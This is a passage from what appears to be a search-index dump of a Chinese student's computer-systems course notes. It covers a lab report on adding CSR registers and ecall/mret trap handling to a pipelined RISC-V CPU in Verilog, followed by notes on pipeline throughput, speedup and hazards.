\u6307\u4ee4\uff0c\u4e00\u53e5\u5c31\u53ef\u80fd\u8fdb\u884c\u591a\u4e2a CSR \u5bc4\u5b58\u5668\u7684\u8bfb\u5199\uff0c\u6240\u4ee5\u9488\u5bf9 trap \u6211\u8fdb\u884c\u4e86\u7279\u6b8a\u7684\u5904\u7406\uff1a</p> <ul> <li>\u4f20\u5165\u4e00\u4e2a trap\uff0c00 \u8868\u793a\u6ca1\u6709 trap\uff0c01 \u8868\u793a\u662f ecall\uff0c10 \u8868\u793a\u662f\u975e\u6cd5\u6307\u4ee4</li> <li>\u8fd8\u9700\u8981\u4f20\u5165\u6b64\u65f6\u7684 pc \u503c</li> <li>\u540e\u4e24\u8005\u9700\u8981\u5c06 pc \u5199\u5165 mepc\uff0c\u5c06\u5bf9\u5e94\u5f02\u5e38\u503c\u5199\u5165 mcause</li> </ul> <p>\u5176\u4f59\u60c5\u51b5\u7c7b\u4f3c GPR \u4e00\u6837\u5904\u7406\u5373\u53ef\uff08\u5373\u65f6\u8bfb\u53d6\u3001\u5199\u5165 double bump\uff09\uff1a</p> <pre><code>`timescale 1ns / 1ps\n\nmodule CSRs (\n    input           clk,\n    input           rst,\n    input           we,\n    input   [1:0]   trap, // 00 no trap, 01 ecall, 10 unimp, 11 mret\n    input   [31:0]  pc,\n    input   [11:0]  csr_read_addr,\n    input   [11:0]  csr_write_addr,\n    input   [31:0]  csr_write_data,\n    output  [31:0]  csr_read_data\n);\n    reg [31:0] mstatus, mepc, mtvec, mcause;\n\n    assign csr_read_data = (csr_read_addr == 12'h300) ? mstatus :\n                           (csr_read_addr == 12'h341) ? mepc :\n                           (csr_read_addr == 12'h305) ? mtvec :\n                           (csr_read_addr == 12'h342) ? mcause : 0;\n\n    always @(negedge clk or posedge rst) begin\n        if (rst == 1) begin\n            mstatus &lt;= 0;\n            mepc &lt;= 0;\n            mtvec &lt;= 0;\n            mcause &lt;= 0;\n        end\n        else if (trap != 0) begin\n            if (trap == 2'b01) begin\n                mepc &lt;= pc;\n                mcause &lt;= 11;\n            end\n            else if (trap == 2'b10) begin\n                mepc &lt;= pc;\n                mcause &lt;= 2;\n            end\n        end\n        else if (we == 1) begin\n            if (csr_write_addr == 12'h300) mstatus &lt;= csr_write_data;\n            else if (csr_write_addr == 12'h341) mepc &lt;= csr_write_data;\n            else if (csr_write_addr == 12'h305) mtvec &lt;= csr_write_data;\n            else if (csr_write_addr == 12'h342) mcause &lt;= csr_write_data;\n        end\n    end\nendmodule\n</code></pre>"},{"location":"cs/system/cs2/lab7/#_6","title":"\u63a7\u5236\u6a21\u5757\u4e0e\u6570\u636e\u901a\u8def\u6269\u5145","text":"<p>\u6211\u7684\u8bbe\u8ba1\u662f\u5c06 CSR \u548c GPR \u540c\u6837\u653e\u5728 ID \u9636\u6bb5\u8fdb\u884c\u8bfb\u53d6\uff0c\u540c\u6837\u5728 WB \u9636\u6bb5\u518d\u8fdb\u884c\u5199\u56de\u3002</p> <pre><code>CSRs csrs (\n    .clk(clk),\n    .rst(rst),\n    .we(MEM_WB_csr_write),\n    .trap(trap),\n    .pc(IF_ID_pc),\n    .csr_read_addr(csr_read_addr),\n    .csr_write_addr(MEM_WB_csr_write_addr),\n    .csr_write_data(MEM_WB_csr_write_data),\n    .csr_read_data(csr_read_data)\n);\n</code></pre> <p>\u5177\u4f53\u7684 CSR \u8bfb\u53d6\u5730\u5740\u7531\u63a7\u5236\u6a21\u5757\u6765\u8fdb\u884c\u5904\u7406\uff0c\u591a\u5c06 inst[31:20] \u90e8\u5206\u4f20\u5165\u63a7\u5236\u6a21\u5757\uff0c\u5982\u679c\u662f CSR \u6307\u4ee4\u5219\u4fdd\u7559\u539f\u6837\uff0c\u5982\u679c\u662f ecall\u3001\u975e\u6cd5\u6307\u4ee4\u5219\u8fd8\u8981\u5f3a\u5236\u8bfb\u53d6 mtvec \u503c\uff0c\u5982\u679c\u662f mret \u6307\u4ee4\u8fd8\u8981\u8bfb\u53d6 mepc \u503c\u3002\u7136\u540e\u8bfb\u51fa\u6765\u7684\u503c\u4f20\u5165 PC \u7684\u9009\u62e9\u5668\uff0c\u8fd9\u51e0\u79cd\u60c5\u51b5\u76f4\u63a5\u9009\u62e9 csr \u8bfb\u53d6\u7684\u503c\u4f5c\u4e3a pc\u3002\u53e6\u5916\u6839\u636e\u6211\u7684\u8bbe\u8ba1\uff0c\u8fd9\u4e9b\u6d89\u53ca\u5230\u8df3\u8f6c\u7684\u6307\u4ee4\u90fd\u9700\u8981\u5f3a\u5236 stall \u4e00\u4e2a\u5468\u671f\uff0c\u53ef\u4ee5\u548c\u539f\u6765\u7684 jump \u4fe1\u53f7\u4e00\u8d77\u5904\u7406\u3002</p> <pre><code>module Control (\n    ...\n    input       [11:0]  csr,\n    output reg  [1:0]   pc_src,     // 00 pc+4 01 JALR 10 JAL 11 csr\n    ...\n    output reg  [2:0]   mem_to_reg, // 00 \u5199\u56de\u6570\u636e\u6765\u81ea ALU 01 \u6765\u81ea\u7acb\u5373\u6570 10 \u6765\u81ea pc+4 11 \u6765\u81ea data memory 100 \u6765\u81ea csr\n    ...\n    output reg  [1:0]   trap,       // 00 no trap, 01 ecall, 10 unimp, 11 mret(\u6807\u8bc6\u8df3\u8f6c)\n    output reg  [11:0]  csr_read_addr,\n    output reg  [11:0]  csr_write_addr,\n    output reg          csr_write\n);\n    `include \"AluOp.vh\"\n    always @(*) begin\n    ...\n    case (op_code)\n        ...\n        7'b1110011: begin   // system\n            case (funct3)\n                3'b000: begin\n                    case (csr)\n                        12'b000000000000: begin // ecall\n                            trap = 2'b01;   csr_read_addr = 12'h305;\n                            pc_src = 2'b11;\n                        end\n                        12'b001100000010: begin // mret\n                            trap = 2'b11;\n                            csr_read_addr = 12'h341;  pc_src = 2'b11;\n                        end\n                        default: begin\n                            trap = 2'b10;   csr_read_addr = 12'h305;\n                            pc_src = 2'b11;\n                        end\n                    endcase\n                end\n                3'b001: begin // csrrw\n                    if (csr != 12'h300 &amp;&amp; csr != 12'h341 &amp;&amp; csr != 12'h305 &amp;&amp; csr != 12'h342) begin\n                        trap = 2'b10;   csr_read_addr = 12'h305;\n                        pc_src = 2'b11;\n                    end else begin\n                        csr_write = 1;  csr_read_addr = csr;\n                        csr_write_addr = csr; csr_write_src = 0;\n                        reg_write = 1;  mem_to_reg = 3'b100;\n                    end\n                end\n                3'b010: begin // csrrs\n                    if (csr != 12'h300 &amp;&amp; csr != 12'h341 &amp;&amp; csr != 12'h305 &amp;&amp; csr != 12'h342) begin\n                        trap = 2'b10;   csr_read_addr = 12'h305;\n                        pc_src = 2'b11;\n                    end else begin\n                        csr_write = 0;  csr_read_addr = csr; // csrr\n                        alu_op = OR;    alu_src_b = 2'b01;\n                        reg_write = 1;  mem_to_reg = 3'b100;\n                    end\n                end\n                default: begin\n                    trap = 2'b10;   csr_read_addr = 12'h305;\n                    pc_src = 2'b11;\n                end\n            endcase\n        end\n        default: begin\n            trap = 2'b10;   csr_read_addr = 12'h305;\n            pc_src = 2'b11;\n        end\n    endcase\n    end\n</code></pre> <p>\u5bf9\u4e8e CSR \u548c GPR \u7684\u5199\u56de\u3002GPR \u53ea\u9700\u8981\u6269\u5145\u4e00\u4e0b mem_to_reg\uff0c\u52a0\u4e00\u4e2a\u4ece csr_read_data \u7684\u6765\u6e90\u5373\u53ef\u3002\u800c CSR \u8003\u8651\u5230\u6570\u636e\u5192\u9669\uff0c\u8fd9\u91cc\u76f4\u63a5\u4f7f\u7528 EX \u9636\u6bb5\u5df2\u7ecf forwarding \u5904\u7406\u540e\u7684 alu_data1 \u6765\u5411\u540e\u4f20\u9012\u4f5c\u4e3a csr_write_data\uff08\u6b63\u5e38\u6765\u8bb2\u8fd9\u91cc\u8981\u901a\u8fc7 ALU \u8fd0\u7b97\u7684\uff0c\u4f46\u662f\u76ee\u524d\u8fd8\u6ca1\u6709\u5904\u7406\uff09\u3002</p> <pre><code>always @(posedge clk or posedge rst) begin\n    ...\n    EX_MEM_csr_write_data &lt;= alu_data1\n    ...\nend\n\n...\n\nMux8x32 mux8x32 (\n    .I0(MEM_WB_alu_result),\n    .I1(MEM_WB_imm),\n    .I2(MEM_WB_pc + 4),\n    .I3(MEM_WB_data_in),\n    .I4(MEM_WB_csr_read_data),\n    .I5(0),\n    .I6(0),\n    .I7(0),\n    .s(MEM_WB_mem_to_reg),\n    .o(write_data)\n);\n</code></pre> <p>\u540c\u65f6\u8fd8\u8981\u8003\u8651\u51e0\u4e2a\u65b0\u589e\u7684\u6570\u636e\u5192\u9669\uff0c\u9996\u5148\u662f\u8bbe\u7f6e mepc \u540e\u4e0b\u4e00\u6761\u6307\u4ee4 mret\uff0c\u7531\u4e8e mret \u7684 csr \u8bfb\u51fa\u503c\u6700\u540e\u8981\u4f20\u5165 PC \u9009\u62e9\u5668\u4f5c\u4e3a pc\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u4e2d\u95f4\u63d2\u5165\u4e00\u4e2a\u9488\u5bf9\u8fd9\u4e2a\u7684 forwarding \u5355\u5143\uff0c\u63a2\u6d4b\u4e00\u4e0b\u4e0a\u4e00\u6761\u6307\u4ee4\u662f\u5426\u5199\u5165\u4e86 mepc\uff0c\u8fd9\u91cc\u76f4\u63a5\u9009\u62e9\u51fa\u6b63\u786e\u7684 mepc \u503c\u4f5c\u4e3a\u8f93\u51fa\uff0c\u7136\u540e\u4f20\u7ed9 PC \u9009\u62e9\u5668\u3002MretForwarding \u5355\u5143\uff1a</p> <pre><code>module MretForwarding (\n    input           ID_EX_csr_write,\n    input   [11:0]  ID_EX_csr_write_addr,\n    input   [31:0]  EX_MEM_alu_result,\n    input   [31:0]  csr_read_data,\n    input   [1:0]   trap, // 00 no trap, 01 ecall, 10 unimp\n    output  [31:0]  csr_ret_pc\n);\n    reg     [31:0]  _csr_ret_pc;\n    assign csr_ret_pc = _csr_ret_pc;\n    always @(*) begin\n        if (trap == 2'b11) begin\n            if (ID_EX_csr_write == 1 &amp;&amp; ID_EX_csr_write_addr == 12'h341) begin\n                _csr_ret_pc &lt;= EX_MEM_alu_result;\n            end\n            else begin\n                _csr_ret_pc &lt;= csr_read_data;\n            end\n        end else begin\n            _csr_ret_pc &lt;= csr_read_data;\n        end\n    end\nendmodule\n</code></pre> <p>\u6570\u636e\u901a\u8def\u4e2d\u7684\u8fde\u63a5\uff1a</p> <pre><code>MuxPC mux_pc (\n    .I0(jump ? pc : pc + 4),\n    .I1(jalr_addr),\n    .I2(jal_addr),\n    .I3(csr_ret_pc),\n    .s(pc_src),\n    .branch(branch),\n    .b_type(b_type),\n    .alu_res(reg1 ^ reg2),\n    .o(pc_next)\n);\n\nMretForwarding mretforwarding (\n    .ID_EX_csr_write(ID_EX_csr_write),\n    .ID_EX_csr_write_addr(ID_EX_csr_write_addr),\n    .EX_MEM_alu_result(EX_MEM_alu_result),\n    .csr_read_data(csr_read_data),\n    .trap(trap),\n    .csr_ret_pc(csr_ret_pc)\n);\n</code></pre> <p>\u53e6\u5916\u4e00\u4e2a\u9700\u8981\u8003\u8651\u7684\u662f csrr \u6307\u4ee4\u540e\u5bf9\u5176\u5199\u5165\u7684 gpr \u8fdb\u884c\u4fee\u6539\uff0c\u7531\u4e8e\u76ee\u524d\u7684\u8bbe\u8ba1\u6211\u5e76\u6ca1\u6709\u5c06 csr \u6307\u4ee4\u7ecf\u8fc7 ALU \u5355\u5143\uff0c\u6240\u4ee5\u5176 ALU \u7ed3\u679c\u662f\u672a\u77e5\u7684\uff0c\u800c\u8fd9\u91cc\u663e\u7136\u56de\u51fa\u73b0\u6570\u636e\u5192\u9669\uff0c\u5904\u7406\u5355\u5143\u4f1a\u8bfb\u53d6\u8fd9\u4e00\u9636\u6bb5\u7684 ALU \u8f93\u51fa\u503c\u8fdb\u884c\u524d\u9012\uff0c\u5bfc\u81f4\u4e0b\u4e00\u4e2a\u8bed\u53e5\u7684\u7ed3\u679c\u4e0d\u6b63\u786e\u3002</p> <p>\u8fd9\u91cc\u7684\u4e00\u4e2a\u66f2\u7ebf\u6551\u56fd\u7684\u65b9\u6cd5\u662f\uff0c\u5728 forwarding \u5355\u5143\u4e2d\uff0c\u5982\u679c\u5f53\u524d\u6307\u4ee4\u7684 b \u64cd\u4f5c\u6570\u662f\u7acb\u5373\u6570\uff0c\u5219\u4e0d\u4f1a\u8fdb\u884c\u4efb\u4f55\u524d\u9012\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728\u6b64\u65f6\u5224\u65ad\uff0c\u5c06\u7acb\u5373\u6570\u66ff\u6362\u4e3a csr \u7684\u8bfb\u51fa\u503c\uff0c\u8fd9\u6837\u518d\u914d\u5408\u63a7\u5236\u6a21\u5757\u7684\u4fe1\u53f7\uff0c\u5219\u53ef\u4ee5\u6b63\u5e38\u901a\u8fc7\u4e00\u6b21 ALU \u8fd0\u7b97\uff0c\u5f97\u5230\u7528\u4e8e\u524d\u9012\u7684\u7ed3\u679c\uff08\u4f46\u76ee\u524d\u8fd9\u4e2a\u7ed3\u679c\u4f1a\u88ab\u820d\u5f03\uff0c\u6709\u65f6\u95f4\u53ef\u4ee5\u76f4\u63a5\u7528\u8fd9\u4e2a\u5b8c\u6574\u5b9e\u73b0\u6240\u6709 csr \u6307\u4ee4\uff09\uff1a <pre><code>wire    [31:0]  alu_b_imm;\nassign alu_b_imm = (ID_EX_mem_to_reg == 3'b100 ? ID_EX_csr_read_data : ID_EX_imm);\n\nMux8x32 mux_alu_b (\n    ...\n    .I3(alu_b_imm),\n    ...\n);\n</code></pre></p>"},{"location":"cs/system/cs2/lab7/#_7","title":"\u5b9e\u9a8c\u7ed3\u679c","text":""},{"location":"cs/system/cs2/lab7/#_8","title":"\u4eff\u771f\u6ce2\u5f62\u89e3\u6790","text":"<p>\u8fd9\u91cc\u53ea\u89e3\u6790 advance \u7248\u672c\u7684\u6ce2\u5f62\uff0c\u6309\u987a\u5e8f\u5206\u6210\u51e0\u4e2a\u90e8\u5206\u8fdb\u884c\u89e3\u6790\uff1a  </p> <p>\u6700\u7ec8\u6574\u4f53\u7684\u6ce2\u5f62\uff1a </p> <p>\u53ef\u89c1\u540e\u9762 gp \u5728 0x101 \u548c 0x102 \u4e4b\u95f4\u53cd\u590d\u53d8\u6362\u3002</p>"},{"location":"cs/system/cs2/lab7/#_9","title":"\u4e0a\u677f\u9a8c\u8bc1","text":"<p>\u4e0a\u677f\u9a8c\u8bc1\u7ed3\u679c\u4e00\u81f4\uff0c\u4e14\u5df2\u7ecf\u9a8c\u6536\u901a\u8fc7\u3002</p>"},{"location":"cs/system/cs2/topic1/","title":"\u6d41\u6c34\u7ebf CPU","text":"<p> \u7ea6 3392 \u4e2a\u5b57  3 \u884c\u4ee3\u7801  14 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161 \u7b2c 2 \u81f3 6 \u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/system/cs2/topic1/#_1","title":"\u6548\u7387\u4f30\u6d4b","text":"<ul> <li>\u5355\u5468\u671f CPU \u7684\u65f6\u949f\u5468\u671f\u4e3a\u6700\u957f\u7684\u6307\u4ee4\u8fd0\u884c\u65f6\u95f4</li> <li>\u6d41\u6c34\u7ebf CPU \u7684\u65f6\u949f\u5468\u671f\u4e3a\u6700\u957f\u7684\u64cd\u4f5c\u65f6\u95f4</li> </ul>"},{"location":"cs/system/cs2/topic1/#_2","title":"\u8ba1\u7b97\u6307\u6807","text":""},{"location":"cs/system/cs2/topic1/#_3","title":"\u541e\u5410\u91cf","text":"<p>\u541e\u5410\u91cf\uff08TP\uff0cThroughput\uff09\uff1a\\(TP = \\dfrac{n}{T}\\)\uff08\\(n\\) \u8868\u793a\u6307\u4ee4\u6761\u6570\uff0c\\(T\\) \u8868\u793a\u8fd0\u884c\u603b\u65f6\u957f\uff09</p> <p> </p> <p>\u4e0a\u56fe\u4e2d\u540c\u4e00\u6570\u5b57\u4e3a\u540c\u4e00\u6761\u6307\u4ee4\uff0c\u7eb5\u5750\u6807\u4e3a\u4e0d\u540c\u9636\u6bb5\u7684\u64cd\u4f5c</p> <ul> <li>\u8bb0\u6bcf\u6761\u6307\u4ee4\u7684\u9636\u6bb5\u6570\u4e3a \\(m\\)\uff08\u9636\u6570\uff09\u3001\u6bcf\u4e2a\u9636\u6bb5\u7684\u8fd0\u884c\u65f6\u95f4\u4e3a \\(\\Delta t_0\\)\uff0c\u5219 \\(T = (m+n-1)\\Delta t_0\\)\uff0c\\(TP = \\dfrac{n}{m+n-1}\\cdot\\dfrac{1}{\\Delta t_0}\\)</li> <li>\u6700\u5927\u541e\u5410\u91cf\uff1a\u5f53 \\(n\\gg m\\) \u65f6\uff0c\\(TP\\) \u8fbe\u5230\u6700\u5927\uff0c\u5373 \\(TP_{\\rm max}=\\dfrac{1}{\\Delta t_0}\\)</li> <li>\u5b9e\u9645\u60c5\u51b5\u4e0b\u5404\u9636\u6bb5\u7684\u8fd0\u884c\u65f6\u95f4\u4e0d\u540c\uff0c\u6700\u957f\u7684\u79f0\u4e3a\u74f6\u9888\u9636\u6bb5\uff08bottleneck segment\uff09<ul> <li>\u8fd9\u79cd\u60c5\u51b5\u4e0b \\(TP\\) \u7684\u8ba1\u7b97\u65b9\u5f0f\u4e0d\u53d8\uff0c\\(TP_{\\rm max}=\\dfrac{1}{\\max(\\Delta t_1, \\Delta t_2, \\cdots, \\Delta t_m)}\\)</li> </ul> </li> <li>\u89e3\u51b3\u6d41\u6c34\u7ebf\u74f6\u9888\u7684\u65b9\u6cd5\uff1a<ul> <li>\u5c06\u74f6\u9888\u9636\u6bb5\u7ec6\u5206\u4e3a\u53ef\u4ee5\u6d41\u6c34\u7ebf\u64cd\u4f5c\u7684\u66f4\u5c0f\u9636\u6bb5\uff08Subdivision\uff09</li> <li>\u91cd\u53e0\u6267\u884c\u4e0d\u540c\u6307\u4ee4\u7684\u74f6\u9888\u9636\u6bb5\uff08Repetition\uff09</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic1/#_4","title":"\u52a0\u901f\u6bd4","text":"<p>\u52a0\u901f\u6bd4\uff08Sp\uff0cSpeedup\uff09\uff1a\\(Sp = \\dfrac{\\text{Execution Time}_\\text{non-pipelined}}{\\text{Execution Time}_\\text{pipelined}}\\)</p> <ul> <li>\u540c\u4e0a\u56fe\uff0c\u53ef\u4ee5\u8ba1\u7b97\u5f97\u5230 \\(Sp = \\dfrac{n\\cdot m\\cdot\\Delta t_0}{(m+n-1)\\Delta t_0} = \\dfrac{nm}{m+n-1}\\)</li> <li>\u5f53 \\(n\\gg m\\) \u65f6\uff0c\\(Sp=m\\)</li> </ul>"},{"location":"cs/system/cs2/topic1/#_5","title":"\u6548\u7387","text":"<p>\u6548\u7387\uff08\\(\\eta\\)\uff09\uff1a\\(\\eta = \\dfrac{Sp}{m}\\)</p> <ul> <li>\u5f53 \\(n\\gg m\\) \u65f6\uff0c\\(\\eta=1\\)</li> </ul>"},{"location":"cs/system/cs2/topic1/#_6","title":"\u6d41\u6c34\u7ebf\u5192\u9669","text":"<p>\u6709\u4e09\u79cd\u7c7b\u578b\u7684\u6d41\u6c34\u7ebf\u5192\u9669\uff1a</p> <ul> <li>\u7ed3\u6784\u5192\u9669\uff08Structural Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u786c\u4ef6\u7ed3\u6784\u7684\u9650\u5236\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c</li> <li>\u6570\u636e\u5192\u9669\uff08Data Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u6570\u636e\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c</li> <li>\u63a7\u5236\u5192\u9669\uff08Control Hazard\uff09\uff1a\u7531\u4e8e\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u63a7\u5236\u4fe1\u53f7\uff0c\u5bfc\u81f4\u6d41\u6c34\u7ebf\u4e0d\u80fd\u6b63\u5e38\u5de5\u4f5c</li> </ul>"},{"location":"cs/system/cs2/topic1/#_7","title":"\u7ed3\u6784\u5192\u9669","text":"<ul> <li>\u5bf9\u4e8e\u51af\u8bfa\u4f0a\u66fc\u67b6\u6784\u7684\u8ba1\u7b97\u673a\uff0c\u53ea\u6709\u4e00\u4e2a\u4e3b\u5b58\u7684\u60c5\u51b5\uff0c\u53ef\u80fd\u6709\u4e24\u6761\u6307\u4ee4\u7684 IF \u548c MEM \u9636\u6bb5\u4f1a\u4ea7\u751f\u51b2\u7a81\uff08\u5bf9\u4e8e load store \u7c7b\u6307\u4ee4 MEM \u4f1a\u8bbf\u95ee\u4e3b\u5b58\uff09</li> <li>\u89e3\u51b3\u65b9\u6848<ul> <li>\u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u4e3b\u5b58\u8bbf\u95ee\u5b8c\u6210\u540e\u518d\u53d6\u6307</li> <li>\u6dfb\u52a0\u786c\u4ef6\uff0c\u4f8b\u5982\u6dfb\u52a0\u4e00\u4e2a\u4e3b\u5b58\uff08\u6bd4\u5982\u54c8\u5f17\u67b6\u6784\u5c31\u4e0d\u5b58\u5728\u7ed3\u6784\u5192\u9669\uff09</li> </ul> </li> <li>\u7ed3\u6784\u5192\u9669\u603b\u662f\u53ef\u4ee5\u901a\u8fc7\u6dfb\u52a0\u989d\u5916\u786c\u4ef6\u6765\u89e3\u51b3</li> </ul>"},{"location":"cs/system/cs2/topic1/#_8","title":"\u6570\u636e\u5192\u9669","text":"<ul> <li>\u6570\u636e\u5192\u9669\u7684\u539f\u56e0\uff1a\u6d41\u6c34\u7ebf\u4e2d\u7684\u6307\u4ee4\u9700\u8981\u8bbf\u95ee\u540c\u4e00\u6570\u636e\uff0c\u4f46\u662f\u8be5\u6570\u636e\u5728\u6d41\u6c34\u7ebf\u4e2d\u7684\u4e0d\u540c\u9636\u6bb5\u88ab\u4fee\u6539<ul> <li>\u5982 <code>add x1, x2, x3; sub x4, x1, x5</code> \u4e24\u6761\u6307\u4ee4\uff0cx1 \u5728 add \u7684 EX \u9636\u6bb5\u88ab\u4fee\u6539\uff0c\u5728 WB \u9636\u6bb5\u624d\u4f1a\u88ab\u5199\u56de\u5bc4\u5b58\u5668\uff0c\u800c sub \u7684 ID \u9636\u6bb5\u9700\u8981\u8bbf\u95ee x1\uff0c\u56e0\u6b64\u4ea7\u751f\u6570\u636e\u5192\u9669</li> </ul> </li> <li>\u89e3\u51b3\u65b9\u6848<ul> <li>\u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u6570\u636e\u53ef\u7528\uff08\u4f1a\u635f\u5931\u4e24\u4e2a\u65f6\u949f\u5468\u671f\u624d\u7b49\u5230 ID \u5728 WB \u540e\uff09</li> <li>\u524d\u9012\uff08Forwarding\uff09\uff1a\u5728 ID \u9636\u6bb5\uff0c\u5982\u679c\u9700\u8981\u8bbf\u95ee\u7684\u6570\u636e\u5728 EX \u9636\u6bb5\u88ab\u4fee\u6539\uff0c\u90a3\u4e48\u5c31\u76f4\u63a5\u4ece EX \u9636\u6bb5\u53d6\u6570\u636e\uff0c\u800c\u4e0d\u662f\u4ece\u5bc4\u5b58\u5668\u6587\u4ef6\u4e2d\u53d6\u6570\u636e<ul> <li>\u5e76\u4e0d\u80fd\u5b8c\u5168\u89e3\u51b3\u6570\u636e\u5192\u9669\uff08\u6bd4\u5982 load + add\uff0c\u540e\u4e00\u6761\u7684 EX \u9700\u8981\u524d\u4e00\u6761\u7684 MEM \u7ed3\u679c\uff0c\u800c\u524d\u4e00\u6761 MEM \u8f93\u51fa\u65e0\u6cd5\u63a5\u5230\u540e\u4e00\u6761 EX \u524d\uff09</li> <li>\u5982\u4e0a\u7684 load-use data hazard \u60c5\u51b5\u4e0b\u6682\u505c\u4e00\u4e2a\u65f6\u949f\u5468\u671f\uff08pipeline stall / bubble\uff09\uff0c\u7b49\u5f85 MEM \u9636\u6bb5\u5b8c\u6210\uff0c\u7136\u540e\u5e94\u7528 forwarding\uff0c\u5c06 MEM \u7ed3\u679c\u76f4\u63a5\u4f20\u5165\u540e\u4e00\u6761\u6307\u4ee4\u7684 EX \u9636\u6bb5</li> </ul> </li> <li>\u901a\u8fc7\u8f6f\u4ef6\u5728\u7f16\u8bd1\u65f6\u907f\u514d\u51fa\u73b0 load-use \u60c5\u51b5</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic1/#_9","title":"\u63a7\u5236\u5192\u9669","text":"<ul> <li>\u5e38\u53d1\u751f\u5728\u6761\u4ef6\u8df3\u8f6c\uff08\u5206\u652f\uff09\u6307\u4ee4\u7684\u60c5\u51b5\u4e0b\uff0c\u5373 branch \u6307\u4ee4\u540e\u4e0b\u4e00\u6761\u6307\u4ee4\u53ef\u80fd\u4f1a\u53d1\u751f\u8df3\u8f6c\u800c\u4e0d\u662f\u8bfb\u53d6\u7684\u4e0b\u4e00\u6761\u6307\u4ee4</li> <li>\u89e3\u51b3\u65b9\u6848<ul> <li>\u7b49\u5f85\uff08Stall\uff09\u76f4\u5230\u5206\u652f\u6761\u4ef6\u8ba1\u7b97\u5b8c\u6210\u5f97\u5230\u4e0b\u4e00\u4e2a PC \u540e\u518d\u5bf9\u4e0b\u4e00\u6761\u6307\u4ee4\u8fdb\u884c\u53d6\u6307<ul> <li>\u53ef\u4ee5\u5c06\u5206\u652f\u5224\u65ad\u63d0\u524d\u5230 ID \u9636\u6bb5\uff08\u8bfb\u53d6\u5bc4\u5b58\u5668\u4e4b\u540e\u5c31\u5224\u65ad\uff09\uff0c\u53ea\u9700\u8981 stall \u4e00\u4e2a\u5468\u671f</li> </ul> </li> <li>\u9884\u6d4b\uff08Prediction\uff09\uff1a<ul> <li>\u7b80\u5355\u7248\u672c\uff1a\u603b\u662f\u8ba4\u4e3a\u5206\u652f\u4e0d\u4f1a\u53d1\u751f\uff0c\u5373\u603b\u662f\u9884\u6d4b\u4e0d\u53d1\u751f\u8df3\u8f6c\uff0c\u5982\u679c\u53d1\u751f\u8df3\u8f6c\u5219\u63d2\u5165\u4e00\u6761 bubble</li> <li>\u590d\u6742\u7248\u672c\uff1a\u6839\u636e\u60c5\u51b5\u8fdb\u884c\u9884\u6d4b\uff0c\u4f8b\u5982\u4e00\u4e2a\u5faa\u73af\u6700\u540e\u7684\u5206\u652f\u8bed\u53e5\u603b\u662f\u9884\u6d4b\u53d1\u751f\u8df3\u8f6c</li> <li>\u52a8\u6001\u9884\u6d4b\uff1a\u6839\u636e\u5386\u53f2\u8df3\u8f6c\u60c5\u51b5\u8fdb\u884c\u9884\u6d4b</li> </ul> </li> <li>\u5ef6\u8fdf\u51b3\u7b56\uff08Delayed Decision\uff09\uff1a\u5c06 branch \u524d\u7684\u65e0\u5173\u6307\u4ee4\u79fb\u52a8\u5230 branch \u4e4b\u540e\u7684 bubble \u5904\uff08\u5206\u652f\u5ef6\u8fdf\u69fd\uff09\u6267\u884c\uff0c\u51cf\u5c11\u4e3a\u4e86\u7b49\u5f85\u800c\u63d2\u5165\u7684\u65e0\u610f\u4e49 bubble \u4ee3\u7801</li> </ul> </li> </ul>"},{"location":"cs/system/cs2/topic1/#risc-v","title":"RISC-V \u6d41\u6c34\u7ebf","text":"<ul> <li>RISC-V \u6d41\u6c34\u7ebf\u4e00\u822c\u5305\u542b\u4e94\u4e2a\u9636\u6bb5\uff1a<ul> <li>IF (Instruction Fetch)\uff1a\u53d6\u6307\uff0c\u53d6\u51fa I-Mem \u4e2d PC \u5730\u5740\u5904\u7684\u6307\u4ee4</li> <li>ID (Instruction Decode)\uff1a\u8bd1\u7801\uff0c\u5c06\u6307\u4ee4\u89e3\u7801\u4e3a\u63a7\u5236\u4fe1\u53f7\uff0c\u5e76\u8bfb\u53d6\u5bc4\u5b58\u5668\u503c</li> <li>EX (Execute)\uff1a\u6267\u884c\uff0c\u6267\u884c ALU \u64cd\u4f5c</li> <li>MEM (Memory Access)\uff1a\u8bbf\u5b58\uff0c\u8bbf\u95ee D-Mem \u8fdb\u884c\u5199\u5165\u6216\u8bfb\u53d6</li> <li>WB (Write Back)\uff1a\u5199\u56de\uff0c\u5c06\u7ed3\u679c\u5199\u56de\u5bc4\u5b58\u5668\u6587\u4ef6</li> </ul> </li> <li>RISC-V ISA \u5bf9\u4e8e\u6d41\u6c34\u7ebf\u7684\u4f18\u70b9\uff1a<ul> <li>\u6307\u4ee4\u957f\u5ea6\u56fa\u5b9a\u4e3a 32 \u4f4d\uff0c\u6613\u4e8e\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8fdb\u884c\u53d6\u6307\u6216\u8bd1\u7801</li> <li>\u6307\u4ee4\u683c\u5f0f\u5c11\u4e14\u89c4\u6574\uff0c\u6613\u4e8e\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8bd1\u7801\u3001\u8bfb\u53d6\u5bc4\u5b58\u5668</li> <li>\u4f7f\u7528 load/store \u5bfb\u5740\u7ed3\u6784\uff0c\u4e00\u4e2a\u5468\u671f\u8ba1\u7b97\u5730\u5740\u3001\u4e00\u4e2a\u5468\u671f\u8bbf\u5b58</li> <li>\u8bbf\u5b58\u64cd\u4f5c\u90fd\u662f\u5bf9\u9f50\u7684\uff0c\u53ef\u4ee5\u5728\u4e00\u4e2a\u5468\u671f\u5185\u8fdb\u884c</li> </ul> 